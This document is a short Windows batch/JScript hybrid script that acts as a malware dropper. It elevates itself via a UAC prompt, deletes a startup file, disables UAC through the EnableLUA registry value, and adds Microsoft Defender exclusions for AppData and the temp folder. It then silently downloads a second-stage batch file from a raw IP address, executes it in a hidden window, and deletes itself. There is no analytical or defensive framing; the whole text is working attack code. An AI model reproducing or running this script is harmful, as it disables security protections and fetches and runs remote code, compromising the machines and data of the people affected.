@if (@CodeSection == @Batch) @then

@echo off

if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
  >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
  >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if "%errorlevel%" NEQ "0" (
  goto UACPrompt
) else (
  goto gotAdmin
)

:UACPrompt
echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %*", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"

del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

powershell -windowstyle hidden Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/"
powershell -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"

cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
mkdir Logs
powershell -windowstyle hidden Invoke-WebRequest -Uri http://34.88.221.44:9000/secondary.bat -OutFile secondary.bat
start "" /min powershell -windowstyle hidden -c "Start-Process -WindowStyle Hidden -FilePath cmd.exe -ArgumentList '/c secondary.bat'"

del "%~f0"

@end

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""%~f0""", 0, False
WScript.Quit
exit /b